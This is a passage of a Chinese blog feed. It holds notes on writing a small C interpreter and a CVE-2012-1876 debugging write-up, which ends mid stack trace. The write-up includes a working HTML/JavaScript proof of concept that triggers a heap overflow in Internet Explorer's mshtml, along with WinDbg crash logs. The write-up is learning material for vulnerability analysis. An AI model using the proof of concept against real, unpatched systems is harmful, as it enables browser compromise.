          <category> 格式化字符串 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>手把手教你构建 C 语言编译器（解释器）学习笔记</title>
      <link href="/2018/03/14/lotabout/"/>
      <url>/2018/03/14/lotabout/</url>
      <content type="html"><![CDATA[<h1 id="手把手教你构建-C-语言编译器（解释器）学习笔记"><a href="#手把手教你构建-C-语言编译器（解释器）学习笔记" class="headerlink" title="手把手教你构建 C 语言编译器（解释器）学习笔记"></a>手把手教你构建 C 语言编译器（解释器）学习笔记</h1><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>高级语言程序能够在目标计算机上运行之前，它必须被翻译成机器语言，这个翻译过程，也就是编译。<br>通常必须对任意给定的高级程序和与其对应的机器语言编写专用的编译器，但是这样每种编译器编译的高级语言与编译之后的机器语言之间就存在很强的依赖性。<br>减少这种依赖的方法之一是，将整个编译过程划分为几乎独立的两个阶段。<br>在第一个阶段，高级语言被解析出来，其命令被翻译成一种中间处理结果——既不是高级，也不是低级的结果。<br>在第二个阶段，这些中间结果被进一步翻译成目标硬件的机器语言。<br>从软件工程的角度来分解是十分吸引人的，第一阶段仅依赖于高级语言的细节，第二阶段仅依赖于目标机器语言的细节。<br>当然，两个编译阶段之间的接口十分重要，甚至应该单独抽象成一种语言。<br>实际上我们可以明确的描述这种虚拟机，其指令就是由高级语言分解成的中间处理步骤。<br>这种模型的范例有java(java-&gt;byte code(run in JVM))、c#(.NET-&gt;IL(run in CLR))<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-14-185642.png" alt=""></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><ol><li>我们只设置代码段、数据段（只存放字符串）和栈</li><li>理论上当用户需要分配内存的时候，理论上我们的虚拟机需要维护一个堆用于内存分配，但实际实现上较为复杂且与编译无关，故我们引入一个指令MSET，使我们能直接使用编译器（解释器）中的内存。</li><li>这里为了简化实现过程，大量实现了自己的指令集。</li><li>使用顺序入栈，而不是逆序。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sub_function(arg1, arg2, arg3);</span><br><span class="line"></span><br><span class="line">|    ....       | high address</span><br><span class="line">+---------------+</span><br><span class="line">| arg: 1        |    new_bp + 4</span><br><span class="line">+---------------+</span><br><span class="line">| arg: 2        |    new_bp + 3</span><br><span class="line">+---------------+</span><br><span class="line">| arg: 3        |    new_bp + 2</span><br><span class="line">+---------------+</span><br><span class="line">|return address |    new_bp + 1</span><br><span class="line">+---------------+</span><br><span class="line">| old BP        | &lt;- new BP</span><br><span class="line">+---------------+</span><br><span class="line">| local var 1   |    new_bp - 1</span><br><span class="line">+---------------+</span><br><span class="line">| local var 2   |    new_bp - 2</span><br><span class="line">+---------------+</span><br><span class="line">|    ....       |  low address</span><br></pre></td></tr></table></figure></li></ol><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>运行时候的一些坑点<br>一开始在mac上测试一直segment fault，我就调试了一下。<br>然后注意到比如这个地方<br><code>bp = sp = (int *) ((int) stack + poolsize);// stack grow from high to low</code><br>明显是按照32位地址空间去算的，(int)stack是4字节。<br>所以放进虚拟机里，加上-m32编译。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/logcat$ gcc main.c -m32 -o main</span><br><span class="line">sakura@ubuntu:~/logcat$ ls</span><br><span class="line">main  main.c</span><br><span class="line">sakura@ubuntu:~/logcat$ ./main</span><br><span class="line">exit(30)</span><br></pre></td></tr></table></figure></p><h2 id="词法分析器"><a href="#词法分析器" class="headerlink" title="词法分析器"></a>词法分析器</h2><p>前面的环境准备好之后，我们就可以开始写我们的解释器了。<br>词法分析器对源码字符串做预处理，举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2 + 3 * (4 - 5)</span><br><span class="line">=&gt;</span><br><span class="line">(Number, 2) Add (Number, 3) Multiply Left-Bracket (Number, 4) Subtract (Number, 5) Right-Bracket</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                   +-------+                      +--------+</span><br><span class="line">-- source code --&gt; | lexer | --&gt; token stream --&gt; | parser | --&gt; assembly</span><br><span class="line">                   +-------+                      +--------+</span><br></pre></td></tr></table></figure><p>要是深入词法分析器，你就会发现，它的本质上也是编译器。我们的编译器是以标记流为输入，输出汇编代码，而词法分析器则是以源码字符串为输入，输出标记流。</p><h3 id="标识符与符号表"><a href="#标识符与符号表" class="headerlink" title="标识符与符号表"></a>标识符与符号表</h3><p>标识符（identifier）可以理解为变量名。对于语法分析而言，我们并不关心一个变量具体叫什么名字，而只关心这个变量名代表的唯一标识。例如 int a; 定义了变量 a，而之后的语句 a = 10，我们需要知道这两个 a 指向的是同一个变量。</p><p>基于这个理由，词法分析器会把扫描到的标识符全都保存到一张表中，遇到新的标识符就去查这张表，如果标识符已经存在，就返回它的唯一标识。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Symbol table:</span><br><span class="line">----+-----+----+----+----+-----+-----+-----+------+------+----</span><br><span class="line"> .. |token|hash|name|type|class|value|btype|bclass|bvalue| ..</span><br><span class="line">----+-----+----+----+----+-----+-----+-----+------+------+----</span><br><span class="line">    |&lt;---       one single identifier                ---&gt;|</span><br></pre></td></tr></table></figure><p>后面的内容虽然是懂的。。但是写笔记太长了，暂时END吧。<br>TODO</p>]]></content>
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2012-1876调试笔记</title>
      <link href="/2018/03/10/cve2012_1876/"/>
      <url>/2018/03/10/cve2012_1876/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在调试漏洞战争上的CVE-2012-1876做了一些笔记，漏洞分析的话漏洞战争和vupen的文章已经写的很清楚了。<br>因为是第一次用windbg,所以我主要把自己的环境搭建（比如怎么导入符号文件）和调试日志（十分详细）记录了一下，希望对那些和我一样，刚开始学习漏洞分析与调试的人有所帮助。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://www.dbgtech.net/windbghelp/index.html" target="_blank" rel="noopener">windbg在线手册</a></li><li>漏洞战争</li><li><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/cve_2012_1876/Advanced%20Exploitation%20of%20Internet%20Explorer%20Heap%20Overflow.pdf" target="_blank" rel="noopener">vupen Advanced Exploitation of Internet Explorer Heap Overflow</a></li></ul><h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul><li>win7 32位:<a href="ed2k://|file|cn_windows_7_professional_x86_dvd_x15-65790.iso|2604238848|e812fbe758f05b485c5a858c22060785|h=S5RNBL5JL5NRC3YMLDWIO75YY3UP4ET5|/" target="_blank" rel="noopener">下载链接</a></li><li>windbg6.1:<a href="https://pan.baidu.com/s/13nzTnsmmWDJoJRSBsb_ZPw" target="_blank" rel="noopener">下载链接</a></li></ul><h3 id="windbg符号文件设置"><a href="#windbg符号文件设置" class="headerlink" title="windbg符号文件设置"></a>windbg符号文件设置</h3><p>在windbg的窗口里输入<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-072206.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*c:\localsymbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure></p><p>重启后要重新输入。</p><h2 id="poc调试"><a href="#poc调试" class="headerlink" title="poc调试"></a>poc调试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;table style=<span class="string">"table-layout:fixed"</span> &gt;</span><br><span class="line">        &lt;col id=<span class="string">"132"</span> width=<span class="string">"41"</span> span=<span class="string">"1"</span> &gt;&amp;nbsp &lt;<span class="regexp">/col&gt;</span></span><br><span class="line"><span class="regexp"> &lt;/</span>table&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">        obj_col.width = <span class="string">"42765"</span>;</span><br><span class="line">        obj_col.span = <span class="number">1000</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> setTimeout(<span class="string">"over_trigger();"</span>,<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> &lt;/</span>body&gt;</span><br><span class="line"> &lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p>基于HPA的漏洞分析方法</p><ul><li>hpa：启动页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</li></ul><p>在终端通过gflags启动hpa<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-065200.png" alt=""><br>启动ie浏览器后，用windbg attach进程<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-065933.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-070005.png" alt=""><br>两个进程，一个是broker进程 一个是页面的内容进程，附加后面的那个就可以，就是内容进程。<br>检查一下hpa开了没。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; .symfix</span><br><span class="line">0:000&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">................................................................</span><br><span class="line">.............................</span><br><span class="line">0:000&gt; !gflag</span><br><span class="line">Current NtGlobalFlag contents: 0x02000000</span><br><span class="line">    hpa - Place heap allocations at ends of pages</span><br></pre></td></tr></table></figure></p><p>然后需要开启子进程调试，这样才能断下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.childdbg 1</span><br></pre></td></tr></table></figure></p><p>然后g，启动调试器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:027&gt; g</span><br><span class="line">ModLoad: 74c30000 74c38000   C:\Windows\system32\credssp.dll</span><br><span class="line">ModLoad: 752a0000 752a8000   C:\Windows\system32\secur32.dll</span><br><span class="line">ModLoad: 750c0000 750f8000   C:\Windows\system32\ncrypt.dll</span><br><span class="line">ModLoad: 750a0000 750b7000   C:\Windows\system32\bcrypt.dll</span><br><span class="line">ModLoad: 74c70000 74cad000   C:\Windows\system32\bcryptprimitives.dll</span><br><span class="line">ModLoad: 74b50000 74b66000   C:\Windows\system32\GPAPI.dll</span><br><span class="line">ModLoad: 70c60000 70c7c000   C:\Windows\system32\cryptnet.dll</span><br><span class="line">ModLoad: 72e70000 72e85000   C:\Windows\system32\Cabinet.dll</span><br><span class="line">ModLoad: 74d10000 74d1e000   C:\Windows\system32\DEVRTL.dll</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-070815.png" alt=""><br>看到debugger正在运行了。<br>然后把poc拖到浏览器里运行。<br>另外poc拖进去之后，会自动断下来。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-071745.png" alt=""><br>再g一下，就变成下面这个样子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1:021&gt; g</span><br><span class="line">ModLoad: 760f0000 7610f000   C:\Windows\system32\IMM32.DLL</span><br><span class="line">ModLoad: 75b40000 75c0c000   C:\Windows\system32\MSCTF.dll</span><br><span class="line">ModLoad: 6ccf0000 6d76c000   C:\Windows\system32\IEFRAME.dll</span><br><span class="line">ModLoad: 75da0000 75da5000   C:\Windows\system32\PSAPI.DLL</span><br><span class="line">ModLoad: 72940000 7297c000   C:\Windows\system32\OLEACC.dll</span><br><span class="line">ModLoad: 741a0000 7433e000   C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7600.16385_none_421189da2b7fabfc\comctl32.dll</span><br><span class="line">ModLoad: 75810000 7588b000   C:\Windows\system32\comdlg32.dll</span><br><span class="line">ModLoad: 71620000 71655000   C:\Program Files\Internet Explorer\IEShims.dll</span><br><span class="line">ModLoad: 75460000 7546c000   C:\Windows\system32\CRYPTBASE.dll</span><br><span class="line">ModLoad: 74390000 743d0000   C:\Windows\system32\uxtheme.dll</span><br><span class="line">ModLoad: 75500000 7550e000   C:\Windows\system32\RpcRtRemote.dll</span><br><span class="line">ModLoad: 735b0000 735c3000   C:\Windows\system32\dwmapi.dll</span><br><span class="line">ModLoad: 723c0000 723f3000   C:\Program Files\Internet Explorer\sqmapi.dll</span><br><span class="line">ModLoad: 74f90000 74fa6000   C:\Windows\system32\CRYPTSP.dll</span><br><span class="line">ModLoad: 76170000 7630d000   C:\Windows\system32\SETUPAPI.dll</span><br><span class="line">ModLoad: 756b0000 756d7000   C:\Windows\system32\CFGMGR32.dll</span><br><span class="line">ModLoad: 756e0000 756f2000   C:\Windows\system32\DEVOBJ.dll</span><br><span class="line">ModLoad: 74d30000 74d6b000   C:\Windows\system32\rsaenh.dll</span><br><span class="line">ModLoad: 764a0000 76523000   C:\Windows\system32\CLBCatQ.DLL</span><br><span class="line">ModLoad: 743f0000 744e5000   C:\Windows\system32\propsys.dll</span><br><span class="line">ModLoad: 6f9e0000 6fa0b000   C:\Program Files\Internet Explorer\ieproxy.dll</span><br><span class="line">ModLoad: 772c0000 773b4000   C:\Windows\system32\WININET.dll</span><br><span class="line">ModLoad: 76490000 76493000   C:\Windows\system32\Normaliz.dll</span><br><span class="line">ModLoad: 75510000 7551b000   C:\Windows\system32\profapi.dll</span><br><span class="line">ModLoad: 753f0000 7540a000   C:\Windows\system32\SspiCli.dll</span><br><span class="line">ModLoad: 75db0000 75de5000   C:\Windows\system32\ws2_32.DLL</span><br><span class="line">ModLoad: 759f0000 759f6000   C:\Windows\system32\NSI.dll</span><br><span class="line">ModLoad: 74e10000 74e54000   C:\Windows\system32\dnsapi.DLL</span><br><span class="line">ModLoad: 739a0000 739bc000   C:\Windows\system32\iphlpapi.DLL</span><br><span class="line">ModLoad: 73980000 73987000   C:\Windows\system32\WINNSI.DLL</span><br><span class="line">ModLoad: 6d920000 6d94e000   C:\Windows\system32\MLANG.dll</span><br><span class="line">ModLoad: 75410000 7545b000   C:\Windows\system32\apphelp.dll</span><br><span class="line">ModLoad: 73fe0000 74001000   C:\Windows\system32\ntmarta.dll</span><br><span class="line">ModLoad: 77500000 77545000   C:\Windows\system32\WLDAP32.dll</span><br><span class="line">ModLoad: 74a10000 74a19000   C:\Windows\system32\VERSION.dll</span><br><span class="line">ModLoad: 67b10000 680c2000   C:\Windows\System32\mshtml.dll</span><br><span class="line">ModLoad: 6e2c0000 6e2ea000   C:\Windows\System32\msls31.dll</span><br><span class="line">ModLoad: 75470000 754cf000   C:\Windows\system32\SXS.DLL</span><br><span class="line">ModLoad: 71270000 712a2000   C:\Windows\system32\WINMM.dll</span><br><span class="line">ModLoad: 744f0000 74529000   C:\Windows\system32\MMDevAPI.DLL</span><br><span class="line">ModLoad: 6daf0000 6db20000   C:\Windows\system32\wdmaud.drv</span><br><span class="line">ModLoad: 6dae0000 6dae4000   C:\Windows\system32\ksuser.dll</span><br><span class="line">ModLoad: 74730000 74737000   C:\Windows\system32\AVRT.dll</span><br><span class="line">ModLoad: 6db20000 6db56000   C:\Windows\system32\AUDIOSES.DLL</span><br><span class="line">ModLoad: 74760000 7476b000   C:\Windows\system32\msimtf.dll</span><br><span class="line">ModLoad: 6dad0000 6dad8000   C:\Windows\system32\msacm32.drv</span><br><span class="line">ModLoad: 6dab0000 6dac4000   C:\Windows\system32\MSACM32.dll</span><br><span class="line">ModLoad: 6daa0000 6daa7000   C:\Windows\system32\midimap.dll</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-10-071854.png" alt=""><br>然后允许ActiveX控件运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(4b8.c00): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=06caf000 edi=06caf018</span><br><span class="line">eip=67f3f167 esp=0452daa8 ebp=0452dab4 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+0x15:</span><br><span class="line">67f3f167 890f            mov     dword ptr [edi],ecx  ds:0023:06caf018=????????</span><br></pre></td></tr></table></figure></p><p>然后kb回溯一下栈<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:<span class="number">025</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">0452</span>dab4 <span class="number">67</span>db5b8e <span class="number">00414114</span> <span class="number">0452</span>ddf8 <span class="number">00000001</span> mshtml!CTableColCalc::AdjustForCol+<span class="number">0x15</span></span><br><span class="line"><span class="number">0452</span>db64 <span class="number">67</span>c20713 <span class="number">00000001</span> <span class="number">0452</span>ddf8 <span class="number">000003e8</span> mshtml!CTableLayout::CalculateMinMax+<span class="number">0x52f</span></span><br><span class="line"><span class="number">0452</span>dd80 <span class="number">67</span>c0af19 <span class="number">0452</span>ddf8 <span class="number">0452</span>ddc4 <span class="number">00000001</span> mshtml!CTableLayout::CalculateLayout+<span class="number">0x276</span></span><br><span class="line"><span class="number">0452</span>df2c <span class="number">67</span>cfcc48 <span class="number">0452f</span>5a0 <span class="number">0452e158</span> <span class="number">00000000</span> mshtml!CTableLayout::CalcSizeVirtual+<span class="number">0x720</span></span><br><span class="line"><span class="number">0452e064</span> <span class="number">67</span>cef5d0 <span class="number">06e19</span>ea8 <span class="number">00000000</span> <span class="number">00000000</span> mshtml!CLayout::CalcSize+<span class="number">0x2b8</span></span><br><span class="line"><span class="number">0452e128</span> <span class="number">67</span>cef31d <span class="number">06e19</span>ea8 <span class="number">0001769</span>c <span class="number">0001769</span>c mshtml!CFlowLayout::MeasureSite+<span class="number">0x312</span></span><br><span class="line"><span class="number">0452e170</span> <span class="number">67</span>cef664 <span class="number">0779b</span>f00 <span class="number">00000061</span> <span class="number">0452f</span>5a0 mshtml!CFlowLayout::GetSiteWidth+<span class="number">0x156</span></span><br><span class="line"><span class="number">0452e1</span>b0 <span class="number">67</span>cefb40 <span class="number">07b</span>fafb0 <span class="number">06e19</span>ea8 <span class="number">00000001</span> mshtml!CLSMeasurer::GetSiteWidth+<span class="number">0xce</span></span><br><span class="line"><span class="number">0452e234</span> <span class="number">6e2</span>c665d <span class="number">07862f</span>f8 <span class="number">0452e254</span> <span class="number">0452e318</span> mshtml!CEmbeddedILSObj::Fmt+<span class="number">0x150</span></span><br><span class="line"><span class="number">0452e2</span>c4 <span class="number">6e2</span>c6399 <span class="number">07</span>c12efc <span class="number">00000000</span> <span class="number">07025</span>d20 msls31!ProcessOneRun+<span class="number">0x3e9</span></span><br><span class="line"><span class="number">0452e320</span> <span class="number">6e2</span>c6252 <span class="number">07</span>c12f18 <span class="number">00018258</span> <span class="number">00000000</span> msls31!FetchAppendEscCore+<span class="number">0x18e</span></span><br><span class="line"><span class="number">0452e374</span> <span class="number">6e2</span>c61c3 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000014</span> msls31!LsDestroyLine+<span class="number">0x47f</span></span><br><span class="line"><span class="number">0452e3</span>fc <span class="number">6e2</span>c293f <span class="number">00000007</span> <span class="number">00003832</span> <span class="number">00000000</span> msls31!LsDestroyLine+<span class="number">0x9ff</span></span><br><span class="line"><span class="number">0452e438</span> <span class="number">67</span>cedd81 <span class="number">00000001</span> <span class="number">00000007</span> <span class="number">00003832</span> msls31!LsCreateLine+<span class="number">0xcb</span></span><br><span class="line"><span class="number">0452e588</span> <span class="number">67</span>d017cc <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">07b</span>fafc0 mshtml!CLSMeasurer::LSDoCreateLine+<span class="number">0x127</span></span><br><span class="line"><span class="number">0452e62</span>c <span class="number">67</span>d01ef5 <span class="number">0452</span>ee90 <span class="number">0001769</span>c <span class="number">00000000</span> mshtml!CLSMeasurer::LSMeasure+<span class="number">0x34</span></span><br><span class="line"><span class="number">0452e674</span> <span class="number">67</span>d01db1 <span class="number">00000000</span> <span class="number">00017e6</span>c <span class="number">00000083</span> mshtml!CLSMeasurer::Measure+<span class="number">0x1e6</span></span><br><span class="line"><span class="number">0452e698</span> <span class="number">67</span>d011a2 <span class="number">00017e6</span>c <span class="number">00000083</span> <span class="number">0779b</span>f40 mshtml!CLSMeasurer::MeasureLine+<span class="number">0x1c</span></span><br><span class="line"><span class="number">0452e748</span> <span class="number">67</span>d2a8f6 <span class="number">0452</span>ec68 <span class="number">07470f</span>d8 <span class="number">00000083</span> mshtml!CRecalcLinePtr::MeasureLine+<span class="number">0x46d</span></span><br><span class="line"><span class="number">0452</span>ef50 <span class="number">67</span>d2b304 <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">0000000</span>e mshtml!CDisplay::RecalcLines+<span class="number">0x8bb</span></span><br><span class="line"><span class="number">0452f</span>0a0 <span class="number">67</span>d28c5c <span class="number">0452f</span>5a0 <span class="number">00000007</span> <span class="number">0000000</span>e mshtml!CDisplay::UpdateView+<span class="number">0x208</span></span><br><span class="line"><span class="number">0452f</span>154 <span class="number">67</span>d29ee3 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">0873</span>cf10 mshtml!CFlowLayout::CommitChanges+<span class="number">0x9c</span></span><br><span class="line"><span class="number">0452f</span>264 <span class="number">67</span>c0eb06 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcTextSize+<span class="number">0x30f</span></span><br><span class="line"><span class="number">0452f</span>4ec <span class="number">67</span>d002ee <span class="number">0779b</span>f00 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeCoreCompat+<span class="number">0x1045</span></span><br><span class="line"><span class="number">0452f</span>508 <span class="number">67</span>d00367 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeCore+<span class="number">0x49</span></span><br><span class="line"><span class="number">0452f</span>544 <span class="number">67</span>d0029c <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CBodyLayout::CalcSizeCore+<span class="number">0xd8</span></span><br><span class="line"><span class="number">0452f</span>57c <span class="number">67</span>cfcc48 <span class="number">0452f</span>5a0 <span class="number">0452f</span>6d8 <span class="number">00000000</span> mshtml!CFlowLayout::CalcSizeVirtual+<span class="number">0x1af</span></span><br><span class="line"><span class="number">0452f</span>6b4 <span class="number">67</span>c84121 <span class="number">0779b</span>f00 <span class="number">00000001</span> <span class="number">00000000</span> mshtml!CLayout::CalcSize+<span class="number">0x2b8</span></span><br><span class="line"><span class="number">0452f</span>7a4 <span class="number">67</span>d290f9 <span class="number">00100000</span> <span class="number">00000007</span> <span class="number">059</span>ebeb4 mshtml!CFlowLayout::DoLayout+<span class="number">0x543</span></span><br><span class="line"><span class="number">0452f</span>7e0 <span class="number">67</span>cec8ca <span class="number">059</span>eb870 <span class="number">00100000</span> <span class="number">0452f</span>840 mshtml!CView::ExecuteLayoutTasks+<span class="number">0x3b</span></span><br><span class="line"><span class="number">0452f</span>824 <span class="number">67</span>d2336d <span class="number">00000000</span> <span class="number">0452f</span>870 <span class="number">0000008</span>d mshtml!CView::EnsureView+<span class="number">0x355</span></span><br><span class="line"><span class="number">0452f</span>848 <span class="number">67</span>ce94b2 <span class="number">059</span>eb870 <span class="number">00000000</span> <span class="number">06</span>d24d58 mshtml!CView::EnsureViewCallback+<span class="number">0xd3</span></span><br><span class="line"><span class="number">0452f</span>87c <span class="number">67</span>cd37f7 <span class="number">0452f</span>918 <span class="number">00008002</span> <span class="number">00000000</span> mshtml!GlobalWndOnMethodCall+<span class="number">0xff</span></span><br><span class="line"><span class="number">0452f</span>89c <span class="number">75</span>ce86ef <span class="number">000f</span>0402 <span class="number">00000012</span> <span class="number">00000000</span> mshtml!GlobalWndProc+<span class="number">0x10c</span></span><br><span class="line"><span class="number">0452f</span>8c8 <span class="number">75</span>ce8876 <span class="number">67</span>cc1de3 <span class="number">000f</span>0402 <span class="number">00008002</span> USER32!InternalCallWinProc+<span class="number">0x23</span></span><br><span class="line"><span class="number">0452f</span>940 <span class="number">75</span>ce89b5 <span class="number">00000000</span> <span class="number">67</span>cc1de3 <span class="number">000f</span>0402 USER32!UserCallWinProcCheckWow+<span class="number">0x14b</span></span><br><span class="line"><span class="number">0452f</span>9a0 <span class="number">75</span>ce8e9c <span class="number">67</span>cc1de3 <span class="number">00000000</span> <span class="number">0452f</span>a28 USER32!DispatchMessageWorker+<span 